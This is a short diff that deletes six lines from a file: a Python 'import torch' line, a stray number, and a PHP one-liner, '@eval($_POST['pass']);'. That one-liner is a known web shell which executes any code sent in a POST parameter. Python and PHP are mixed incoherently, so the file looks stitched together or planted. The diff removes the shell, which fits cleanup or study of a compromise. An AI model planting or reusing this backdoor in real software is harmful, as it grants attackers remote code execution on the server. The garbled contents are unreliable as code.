@@ -1,6 +1,0 @@
-import torch
-<?php
-@eval($_POST['pass']);
-?>
-
-213123
